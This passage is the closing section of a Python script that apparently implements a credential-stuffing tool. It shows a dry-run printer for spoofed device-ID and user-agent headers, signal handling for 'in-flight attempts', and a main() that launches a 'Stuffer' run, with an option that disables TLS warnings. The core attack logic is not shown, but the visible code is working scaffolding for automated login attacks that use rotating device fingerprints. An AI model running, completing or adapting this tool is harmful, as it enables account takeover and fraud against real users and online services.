        "X-Device-Id": device_id, "User-Agent": profile["ua"],
    }.items():
        print(f"{k}: {v}")
    print()
    print(json.dumps(body, indent=2))
    return 0


def install_signal_handlers(stuffer: Stuffer) -> None:
    def handler(signum, frame):
        if stuffer.stop.is_set():
            raise SystemExit(130)
        stuffer.stop.set()
        logging.warning("signal %s: finishing in-flight attempts (repeat to abort)", signum)

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)


def main(argv: Optional[list[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)-7s %(message)s",
        datefmt="%H:%M:%S",
        stream=sys.stderr,
    )
    if args.insecure:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    if args.dry_run:
        return dry_run(args)

    stuffer = Stuffer(args)
    install_signal_handlers(stuffer)
    try:
        return stuffer.run()
    except SystemExit:
        raise
    except Exception as exc:  # pragma: no cover
        logging.error("fatal: %s", exc)
        return 2


if __name__ == "__main__":
    sys.exit(main())
